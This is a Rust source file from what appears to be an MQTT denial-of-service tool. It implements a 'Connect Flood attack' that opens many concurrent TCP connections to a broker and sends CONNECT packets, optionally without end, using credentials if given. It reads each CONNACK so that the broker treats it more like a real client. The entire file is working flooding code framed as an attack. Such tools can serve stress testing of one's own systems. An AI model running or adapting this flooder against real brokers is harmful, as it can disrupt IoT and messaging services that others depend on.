use std::sync::{Arc, atomic::Ordering};

use anyhow::{Context, Result, ensure};
use bytes::BytesMut;
use mqttbytes::{Protocol, v4, v5};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    sync::{OwnedSemaphorePermit, Semaphore},
    task::JoinSet,
    time::{self, Duration, sleep},
};

use crate::{
    cli::{Args, ProtocolVersion},
    helper::{
        CLEAN_SESSION, CONNACK_TIMEOUT, Credentials, KEEP_ALIVE_SECS, client_id, packet_count_desc,
    },
    stats::Stats,
};

#[allow(clippy::significant_drop_tightening)]
pub async fn run_connect_flood(args: &Args, broker_addr: &str, stats: Arc<Stats>) -> Result<()> {
    println!(
        "Starting Connect Flood attack against {broker_addr} using MQTT v{} with {} simultaneous connections, sending {} CONNECT packets",
        args.protocol_version,
        args.simultaneous_connections,
        packet_count_desc(args.total_packets)
    );

    let semaphore = Arc::new(Semaphore::new(args.simultaneous_connections.max(1)));
    let reap_threshold = args.simultaneous_connections.saturating_mul(2).max(256);
    let creds: Option<Arc<Credentials>> = args.credentials().map(Arc::new);

    let mut tasks = JoinSet::new();
    let mut remaining = if args.total_packets == 0 {
        usize::MAX
    } else {
        args.total_packets
    };

    while remaining > 0 {
        remaining -= 1;

        let permit = semaphore
            .clone()
            .acquire_owned()
            .await
            .context("semaphore closed")?;
        tasks.spawn(connect_flood_client(
            permit,
            client_id(),
            creds.clone(),
            broker_addr.to_owned(),
            args.protocol_version,
            stats.clone(),
        ));

        while tasks.len() >= reap_threshold {
            if let Some(result) = tasks.join_next().await {
                result.context("worker task panicked")?;
            }
        }

        if args.spawn_delay > 0 {
            sleep(Duration::from_millis(args.spawn_delay)).await;
        }
    }

    while let Some(result) = tasks.join_next().await {
        result.context("worker task panicked")?;
    }

    Ok(())
}

async fn connect_flood_client(
    _permit: OwnedSemaphorePermit,
    client_id: String,
    creds: Option<Arc<Credentials>>,
    broker_addr: String,
    version: ProtocolVersion,
    stats: Arc<Stats>,
) {
    stats.connects_attempted.fetch_add(1, Ordering::Relaxed);

    match time::timeout(
        CONNACK_TIMEOUT,
        connect_once(&client_id, creds.as_deref(), &broker_addr, version),
    )
    .await
    .context("timed out waiting for CONNACK")
    .and_then(|inner| inner)
    {
        Ok(true) => {
            stats.connects_succeeded.fetch_add(1, Ordering::Relaxed);
        }
        Ok(false) => {
            eprintln!("Client {client_id}: connection refused by broker");
            stats.connects_failed.fetch_add(1, Ordering::Relaxed);
        }
        Err(error) => {
            eprintln!("Client {client_id}: {error:#}");
            stats.connects_failed.fetch_add(1, Ordering::Relaxed);
        }
    }
}

async fn connect_once(
    client_id: &str,
    creds: Option<&Credentials>,
    broker_addr: &str,
    version: ProtocolVersion,
) -> Result<bool> {
    let mut buf = BytesMut::new();
    match version {
        ProtocolVersion::V4 => {
            let login = creds
                .cloned()
                .map(|(username, password)| v4::Login { username, password });
            v4::Connect {
                protocol: Protocol::V4,
                keep_alive: KEEP_ALIVE_SECS,
                client_id: client_id.into(),
                clean_session: CLEAN_SESSION,
                last_will: None,
                login,
            }
            .write(&mut buf)
            .map_err(|e| anyhow::anyhow!("failed to serialize CONNECT packet: {e}"))?;
        }
        ProtocolVersion::V5 => {
            let login = creds
                .cloned()
                .map(|(username, password)| v5::Login { username, password });
            v5::Connect {
                protocol: Protocol::V5,
                keep_alive: KEEP_ALIVE_SECS,
                client_id: client_id.into(),
                clean_session: CLEAN_SESSION,
                last_will: None,
                login,
                properties: None,
            }
            .write(&mut buf)
            .map_err(|e| anyhow::anyhow!("failed to serialize CONNECT packet: {e}"))?;
        }
    }

    let mut stream = TcpStream::connect(broker_addr)
        .await
        .with_context(|| format!("connecting to {broker_addr}"))?;
    stream
        .write_all(&buf)
        .await
        .context("sending CONNECT packet")?;

    let success = read_connack(&mut stream).await?;
    stream.shutdown().await.ok();

    Ok(success)
}

// This was added post testing. It should make the broker treat it more like a real client.
async fn read_connack(stream: &mut TcpStream) -> Result<bool> {
    let mut header = [0u8; 1];
    stream.read_exact(&mut header).await?;
    ensure!(
        header[0] >> 4 == 0x2 && header[0] & 0x0F == 0,
        "expected CONNACK, got packet type {:#04x} with flags {:#04x}",
        header[0] >> 4,
        header[0] & 0x0F
    );

    let body_len = read_remaining_length(stream).await?;
    ensure!(body_len >= 2, "CONNACK body too short ({body_len} bytes)");
    let mut body = vec![0u8; body_len];
    stream.read_exact(&mut body).await?;

    Ok(body[1] == 0)
}

async fn read_remaining_length(stream: &mut TcpStream) -> Result<usize> {
    let mut len = 0usize;
    let mut multiplier = 1usize;
    loop {
        let mut byte = [0u8; 1];
        stream.read_exact(&mut byte).await?;
        len += usize::from(byte[0] & 0x7F) * multiplier;
        if byte[0] & 0x80 == 0 {
            return Ok(len);
        }
        multiplier *= 128;
        ensure!(multiplier <= 128 * 128 * 128, "malformed remaining length");
    }
}
